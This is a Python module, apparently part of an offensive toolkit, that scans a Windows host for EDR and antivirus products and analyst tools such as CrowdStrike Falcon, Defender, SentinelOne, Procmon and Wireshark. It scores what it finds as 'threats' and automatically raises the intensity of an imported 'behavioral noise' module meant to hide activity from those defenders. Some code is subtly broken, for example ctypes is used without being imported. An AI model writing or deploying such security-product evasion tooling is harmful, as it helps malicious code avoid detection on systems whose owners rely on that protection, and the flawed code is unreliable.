"""
edr_detector.py - Autonomous EDR/AV detection + behavioral evasion orchestration
=================================================================================
TIER 1: Passive threat detection → Auto-triggers behavioral camouflage

Flow:
1. Scan for EDR/AV processes (CrowdStrike Falcon, Defender, Carbon Black, etc.)
2. Check kernel driver loads (sensor drivers)
3. Monitor registry for security tools
4. Feed anomalies into behavioral_noise for adaptive response
5. Run passively in background with minimal overhead (<2% CPU)

Detected Threats:
- Process signatures (pslist pattern matching)
- Kernel drivers (loaded module scanning)
- Registry artifacts (security tool registrations)
- Network listeners (suspicious security callbacks)

Auto-Response:
- EDR detected → Start behavioral_noise (3% intensity)
- Multiple EDRs → Escalate to 5-7% intensity
- Persistent monitoring → Adaptive intensity scaling

Usage:
    from edr_detector import EDRDetector, AdaptiveEvasionOrchestrator
    
    # Autonomous mode (runs in background)
    orchestrator = AdaptiveEvasionOrchestrator()
    orchestrator.start_monitoring()
    
    # Manual detection check
    detector = EDRDetector()
    threats = detector.scan_for_threats()
    threat_level = detector.calculate_threat_level(threats)
"""

import threading
import time
import logging
import psutil
import os
import sys
import subprocess
from typing import List, Dict, Tuple, Optional
from enum import Enum
from dataclasses import dataclass, field
from datetime import datetime, timedelta

# Gracefully handle missing dependencies
try:
    import winreg
    HAS_WINREG = True
except ImportError:
    HAS_WINREG = False

# Import behavioral noise for auto-triggering
try:
    from behavioral_noise import BehavioralNoisifier
    HAS_BEHAVIORAL_NOISE = True
except ImportError:
    BehavioralNoisifier = None  # type: ignore
    HAS_BEHAVIORAL_NOISE = False

# Import anomaly classifier for integration
try:
    from anomaly_classifier import AnomalyClassifier
    HAS_ANOMALY_CLASSIFIER = True
except ImportError:
    AnomalyClassifier = None  # type: ignore
    HAS_ANOMALY_CLASSIFIER = False

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(name)s: %(message)s')
log = logging.getLogger("EDRDetector")


class ThreatLevel(Enum):
    """Threat severity levels."""
    CLEAR = 0           # No EDR detected
    LOW = 1             # 1 EDR detected
    MEDIUM = 2          # 2-3 EDRs detected
    HIGH = 3            # 4+ EDRs detected
    CRITICAL = 4        # Multiple + behavior monitoring detected


@dataclass
class ThreatSignature:
    """Specific EDR/AV product signature."""
    name: str
    process_names: List[str]
    kernel_drivers: List[str]
    registry_paths: List[str]
    score: int = 1  # Threat score (1-10)


@dataclass
class DetectionResult:
    """Result of a threat scan."""
    detected_processes: List[str] = field(default_factory=list)
    detected_drivers: List[str] = field(default_factory=list)
    detected_registry: List[str] = field(default_factory=list)
    threat_level: ThreatLevel = ThreatLevel.CLEAR
    total_score: int = 0
    detected_at: datetime = field(default_factory=datetime.now)


class EDRDetector:
    """
    Scans system for EDR/AV presence.
    
    Techniques:
    1. Process enumeration (psutil)
    2. Kernel module scanning (if elevated)
    3. Registry artifact hunting
    4. Network listener detection
    """
    
    # Known EDR/AV signatures
    THREAT_SIGNATURES = {
        "CrowdStrike_Falcon": ThreatSignature(
            name="CrowdStrike Falcon",
            process_names=["CSFalconService.exe", "CSFalconServiceAPI.exe", "wmiApSrv.exe"],
            kernel_drivers=["CsFalcon.sys", "CsFalconConfig.sys"],
            registry_paths=[r"HKLM\SYSTEM\CurrentControlSet\Services\CSFalcon"],
            score=9
        ),
        "Windows_Defender": ThreatSignature(
            name="Windows Defender",
            process_names=["MsMpEng.exe", "NisSrv.exe", "SecurityHealthService.exe"],
            kernel_drivers=["WdFilter.sys", "WdNisDrv.sys"],
            registry_paths=[r"HKLM\SYSTEM\CurrentControlSet\Services\WinDefend"],
            score=7
        ),
        "Carbon_Black": ThreatSignature(
            name="Carbon Black",
            process_names=["cb.exe", "cbcompute.exe", "cbsensor.exe"],
            kernel_drivers=["cbk7.sys"],
            registry_paths=[r"HKLM\SYSTEM\CurrentControlSet\Services\CB"],
            score=8
        ),
        "Sentinelone": ThreatSignature(
            name="SentinelOne",
            process_names=["SentinelAgent.exe", "LogProcessorService.exe"],
            kernel_drivers=["sentinelmonitor.sys"],
            registry_paths=[r"HKLM\SYSTEM\CurrentControlSet\Services\SentinelAgent"],
            score=8
        ),
        "Trend_Micro": ThreatSignature(
            name="Trend Micro",
            process_names=["TMCCSF.exe", "KeenAsync.exe", "tmwfp.exe"],
            kernel_drivers=["tmwfp.sys", "vsapint.sys"],
            registry_paths=[r"HKLM\SYSTEM\CurrentControlSet\Services\TmFilter"],
            score=7
        ),
        "McAfee_ENS": ThreatSignature(
            name="McAfee ENS",
            process_names=["mfemms.exe", "memcpy.exe", "mcmgrsvc.exe"],
            kernel_drivers=["mfewfp.sys"],
            registry_paths=[r"HKLM\SYSTEM\CurrentControlSet\Services\McFilter"],
            score=7
        ),
        "VMware_Carbon_Black_Cloud": ThreatSignature(
            name="VMware CB Cloud",
            process_names=["mdr-service.exe", "reprcmd.exe"],
            kernel_drivers=["carbon_black_cloud.sys"],
            registry_paths=[r"HKLM\SYSTEM\CurrentControlSet\Services\VMwareCBService"],
            score=8
        ),
        "Cylance": ThreatSignature(
            name="Cylance",
            process_names=["cyserver.exe", "cylmqctx.exe"],
            kernel_drivers=["cylmqio.sys"],
            registry_paths=[r"HKLM\SYSTEM\CurrentControlSet\Services\Cylance"],
            score=7
        ),
        "Process_Monitor": ThreatSignature(
            name="Process Monitor",
            process_names=["procmon.exe", "procmon64.exe"],
            kernel_drivers=["procfs"],
            registry_paths=[],
            score=4  # Less critical (forensics tool)
        ),
        "WireShark": ThreatSignature(
            name="WireShark",
            process_names=["wireshark.exe"],
            kernel_drivers=["NPcap", "NPF"],
            registry_paths=[],
            score=3  # Network analyzer
        ),
    }
    
    def __init__(self):
        """Initialize EDR detector."""
        self.last_scan = None
        self.last_result: Optional[DetectionResult] = None
        self.scan_history: List[DetectionResult] = []
        self._is_elevated = self._check_elevation()
        self._scan_cache: Optional[DetectionResult] = None
        self._cache_time: Optional[datetime] = None
        self._cache_ttl = 5  # Cache results for 5 seconds
    
    def _check_elevation(self) -> bool:
        """Check if running with admin/root privileges."""
        if sys.platform == 'win32':
            try:
                return os.getuid() == 0 if hasattr(os, 'getuid') else ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        else:
            return os.geteuid() == 0 if hasattr(os, 'geteuid') else False
    
    def scan_for_threats(self) -> DetectionResult:
        """
        Comprehensive threat scan with result caching.
        
        Returns:
            DetectionResult with all detected threats
        """
        # Check cache first
        if self._scan_cache is not None and self._cache_time is not None:
            cache_age = (datetime.now() - self._cache_time).total_seconds()
            if cache_age < self._cache_ttl:
                log.debug(f"Using cached threat scan (age={cache_age:.1f}s)")
                return self._scan_cache
        
        result = DetectionResult()
        scan_start = time.time()
        
        # Scan processes
        result.detected_processes = self._scan_processes()
        
        # Scan kernel drivers (if elevated)
        if self._is_elevated:
            result.detected_drivers = self._scan_kernel_drivers()
        
        # Scan registry (Windows only)
        if sys.platform == 'win32':
            result.detected_registry = self._scan_registry()
        
        # Calculate threat level and total score
        for sig_key, sig in self.THREAT_SIGNATURES.items():
            # Check if processes detected
            for proc in result.detected_processes:
                if any(sig_name.lower() in proc.lower() for sig_name in sig.process_names):
                    result.total_score += sig.score
            
            # Check if drivers detected
            for driver in result.detected_drivers:
                if any(drv.lower() in driver.lower() for drv in sig.kernel_drivers):
                    result.total_score += sig.score
            
            # Check registry
            for reg in result.detected_registry:
                if any(regpath.lower() in reg.lower() for regpath in sig.registry_paths):
                    result.total_score += sig.score
        
        # Determine threat level
        result.threat_level = self._calculate_threat_level(result)
        
        # Log result (only on full scan)
        scan_time = time.time() - scan_start
        log.debug(f"Threat scan complete: {result.threat_level.name} (score={result.total_score}, time={scan_time:.2f}s)")
        
        self.last_scan = datetime.now()
        self.last_result = result
        self.scan_history.append(result)
        
        # Update cache
        self._scan_cache = result
        self._cache_time = datetime.now()
        
        return result
    
    def _scan_processes(self) -> List[str]:
        """Scan for EDR/AV processes."""
        detected = []
        
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    
                    # Check against all signatures
                    for sig_key, sig in self.THREAT_SIGNATURES.items():
                        for target_proc in sig.process_names:
                            if target_proc.lower() in proc_name:
                                detected.append(f"{sig.name}:{proc_name}")
                                log.warning(f"[+] Detected {sig.name}: {proc_name} (PID: {proc.info['pid']})")
                                break
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except Exception as e:
            log.error(f"Process scan failed: {e}")
        
        return detected
    
    def _scan_kernel_drivers(self) -> List[str]:
        """Scan for kernel drivers (requires elevation)."""
        detected = []
        
        if not self._is_elevated:
            return detected
        
        try:
            if sys.platform == 'win32':
                # Use PowerShell to list drivers
                ps_cmd = "Get-WindowsDriver -Online | Select-Object ProviderName | ConvertTo-Csv"
                result = subprocess.run(['powershell', '-Command', ps_cmd], 
                                       capture_output=True, text=True, timeout=5)
                drivers = [line.strip('"') for line in result.stdout.split('\n') if line.strip()]
                
                # Check against signatures
                for sig_key, sig in self.THREAT_SIGNATURES.items():
                    for target_driver in sig.kernel_drivers:
                        for driver in drivers:
                            if target_driver.lower() in driver.lower():
                                detected.append(f"{sig.name}:{driver}")
                                log.warning(f"[+] Detected driver: {driver} ({sig.name})")
        except Exception as e:
            log.debug(f"Kernel driver scan failed (expected if non-elevated): {e}")
        
        return detected
    
    def _scan_registry(self) -> List[str]:
        """Scan registry for security tool artifacts."""
        detected = []
        
        if not HAS_WINREG or sys.platform != 'win32':
            return detected
        
        try:
            # Common registry hives to check
            hive_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            ]
            
            for hive, base_path in hive_paths:
                try:
                    key = winreg.OpenKey(hive, base_path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            
                            # Check against signatures
                            for sig_key, sig in self.THREAT_SIGNATURES.items():
                                for sig_registry_path in sig.registry_paths:
                                    if sig_registry_path.split('\\')[-1].lower() in subkey_name.lower():
                                        detected.append(f"{sig.name}:{base_path}\\{subkey_name}")
                                        log.warning(f"[+] Detected registry: {subkey_name} ({sig.name})")
                                        break
                        except WindowsError:
                            pass
                    winreg.CloseKey(key)
                except Exception as e:
                    log.debug(f"Registry scan error: {e}")
        except Exception as e:
            log.debug(f"Registry scan failed: {e}")
        
        return detected
    
    def _calculate_threat_level(self, result: DetectionResult) -> ThreatLevel:
        """Calculate overall threat level from detection results."""
        num_detections = len(result.detected_processes) + len(result.detected_drivers) + len(result.detected_registry)
        score = result.total_score
        
        if score == 0:
            return ThreatLevel.CLEAR
        elif score <= 3:
            return ThreatLevel.LOW
        elif score <= 10:
            return ThreatLevel.MEDIUM
        elif score <= 20:
            return ThreatLevel.HIGH
        else:
            return ThreatLevel.CRITICAL
    
    def calculate_threat_level(self, detections: DetectionResult) -> ThreatLevel:
        """Public interface to threat level calculation."""
        return self._calculate_threat_level(detections)


class AdaptiveEvasionOrchestrator:
    """
    Orchestrates autonomous EDR detection + behavioral evasion response.
    
    Flow:
    1. Scan for EDR/AV threats (periodic)
    2. Calculate threat level
    3. Auto-trigger behavioral noise at appropriate intensity
    4. Feed metrics into anomaly classifier
    5. Adapt noise intensity based on sustained threats
    
    Completely passive - runs in background with <2% CPU overhead.
    """
    
    def __init__(self, scan_interval: int = 30, auto_start: bool = False):
        """
        Initialize orchestrator.
        
        Args:
            scan_interval: Seconds between threat scans (default 30)
            auto_start: Start monitoring immediately
        """
        self.scan_interval = scan_interval
        self.detector = EDRDetector()
        
        # Initialize behavioral noise if available
        self.noise_manager: Optional[BehavioralNoisifier] = None
        if HAS_BEHAVIORAL_NOISE:
            self.noise_manager = BehavioralNoisifier(intensity=0, enable_on_startup=False)
        
        # Initialize anomaly classifier if available
        self.anomaly_classifier: Optional[AnomalyClassifier] = None
        if HAS_ANOMALY_CLASSIFIER:
            self.anomaly_classifier = AnomalyClassifier()
        
        # Monitoring state
        self._monitoring = False
        self._monitor_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        
        # History tracking
        self.threat_history: Dict[datetime, ThreatLevel] = {}
        self.current_threat_level = ThreatLevel.CLEAR
        self.current_noise_intensity = 0
        
        if auto_start:
            self.start_monitoring()
    
    def start_monitoring(self):
        """Start autonomous threat monitoring."""
        if self._monitoring:
            return
        
        self._monitoring = True
        self._stop_event.clear()
        self._monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._monitor_thread.start()
        log.info("[+] Adaptive Evasion Orchestrator started")
    
    def stop_monitoring(self):
        """Stop autonomous threat monitoring."""
        if not self._monitoring:
            return
        
        self._monitoring = False
        self._stop_event.set()
        
        # Stop behavioral noise
        if self.noise_manager:
            self.noise_manager.stop_noise_generator()
        
        if self._monitor_thread:
            self._monitor_thread.join(timeout=5)
        
        log.info("[-] Adaptive Evasion Orchestrator stopped")
    
    def _monitor_loop(self):
        """Main monitoring loop - OPTIMIZED: Only scans on state changes."""
        last_threat_level = ThreatLevel.CLEAR
        consecutive_clear_scans = 0
        adaptive_interval = self.scan_interval
        
        while not self._stop_event.is_set():
            try:
                # Smart scan: Only increase complexity when threat level changes
                detections = self.detector.scan_for_threats()
                self.current_threat_level = detections.threat_level
                self.threat_history[datetime.now()] = detections.threat_level
                
                # Determine if state changed
                state_changed = (detections.threat_level != last_threat_level)
                
                # Determine adaptive evasion intensity
                new_intensity = self._calculate_evasion_intensity(detections.threat_level)
                
                # Update behavioral noise ONLY if intensity changed
                if new_intensity != self.current_noise_intensity:
                    self._update_evasion_intensity(new_intensity)
                    self.current_noise_intensity = new_intensity
                    log.warning(f"[!] Threat state changed: {last_threat_level.name} -> {detections.threat_level.name}, Evasion intensity: {self.current_noise_intensity}%")
                
                # Feed to anomaly classifier
                if self.anomaly_classifier:
                    self.anomaly_classifier.observe("edr_threat_score", float(detections.total_score))
                
                # Only log on state change or high threat
                if state_changed:
                    log.warning(f"[!] Threat level changed: {detections.threat_level.name}, Score: {detections.total_score:.1f}, Intensity: {self.current_noise_intensity}%")
                    last_threat_level = detections.threat_level
                    consecutive_clear_scans = 0
                    adaptive_interval = self.scan_interval  # Reset to normal interval
                elif detections.threat_level == ThreatLevel.CLEAR:
                    consecutive_clear_scans += 1
                    # Adaptive backoff: Increase scan interval when clear for 5+ consecutive scans
                    if consecutive_clear_scans >= 5:
                        adaptive_interval = min(self.scan_interval * 3, 300)  # Max 5 min between scans
                    log.debug(f"[OK] Threat clear (scan {consecutive_clear_scans}) - backoff interval: {adaptive_interval}s")
                else:
                    # Same threat level, just log debug
                    log.debug(f"[*] Threat level stable: {detections.threat_level.name}")
                
            except Exception as e:
                log.error(f"Monitor loop error: {e}")
            
            # Wait for next scan with adaptive interval
            self._stop_event.wait(adaptive_interval)
    
    def _calculate_evasion_intensity(self, threat_level: ThreatLevel) -> int:
        """Map threat level to evasion intensity (0-10%)."""
        intensity_map = {
            ThreatLevel.CLEAR: 0,
            ThreatLevel.LOW: 2,
            ThreatLevel.MEDIUM: 4,
            ThreatLevel.HIGH: 7,
            ThreatLevel.CRITICAL: 10,
        }
        return intensity_map.get(threat_level, 0)
    
    def _update_evasion_intensity(self, intensity: int):
        """Update behavioral noise intensity."""
        if not self.noise_manager:
            log.warning("Behavioral noise not available")
            return
        
        # Stop current noise if running
        if self.noise_manager.enabled:
            self.noise_manager.stop_noise_generator()
        
        # Start new noise at updated intensity
        if intensity > 0:
            self.noise_manager.intensity = intensity
            self.noise_manager.start_noise_generator()
            log.info(f"[~] Behavioral noise escalated to {intensity}%")
        else:
            log.info("[~] Behavioral noise disengaged (threat clear)")
    
    def get_threat_summary(self) -> Dict:
        """Get current threat assessment."""
        return {
            "current_threat_level": self.current_threat_level.name,
            "current_threat_score": self.detector.last_result.total_score if self.detector.last_result else 0,
            "evasion_intensity": self.current_noise_intensity,
            "last_scan": self.detector.last_scan.isoformat() if self.detector.last_scan else None,
            "detections": {
                "processes": len(self.detector.last_result.detected_processes) if self.detector.last_result else 0,
                "drivers": len(self.detector.last_result.detected_drivers) if self.detector.last_result else 0,
                "registry": len(self.detector.last_result.detected_registry) if self.detector.last_result else 0,
            }
        }


# ============ STANDALONE DEMO ============
if __name__ == "__main__":
    log.info("[*] EDR Detector + Adaptive Evasion Orchestrator Demo")
    
    # Single scan
    log.info("\n[1] Running single threat scan...")
    detector = EDRDetector()
    result = detector.scan_for_threats()
    log.info(f"Result: {result.threat_level.name} (score={result.total_score})")
    log.info(f"  Processes: {len(result.detected_processes)}")
    log.info(f"  Drivers: {len(result.detected_drivers)}")
    log.info(f"  Registry: {len(result.detected_registry)}")
    
    # Autonomous mode (30 seconds)
    if HAS_BEHAVIORAL_NOISE:
        log.info("\n[2] Starting autonomous monitoring (30 seconds)...")
        orchestrator = AdaptiveEvasionOrchestrator(scan_interval=5, auto_start=True)
        try:
            time.sleep(30)
        except KeyboardInterrupt:
            pass
        finally:
            orchestrator.stop_monitoring()
            summary = orchestrator.get_threat_summary()
            log.info(f"\nFinal summary: {summary}")
    else:
        log.warning("Behavioral noise not available - skipping autonomous mode")
